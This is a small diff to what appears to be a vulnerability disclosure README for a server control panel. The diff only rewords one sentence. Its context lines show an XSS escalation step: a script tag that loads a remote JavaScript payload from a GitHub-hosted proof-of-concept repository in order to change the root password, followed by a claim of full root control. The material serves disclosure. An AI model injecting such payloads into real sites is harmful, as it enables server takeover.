@@ -36,7 +36,8 @@ I've created 2 examples on how you can escalate this attack to take control of t
 <script type="text/javascript" src="https://raw.githubusercontent.com/TnExperts/cwppoc/main/PayloadChangeRootPass.js"></script>
 ```
 
-3. You can perform any action you want as the root user. Your imagination is the limit....
+
+3. You can perform any action you want as the root user. The only limit is your imagination....
 
 
 #  Timeline
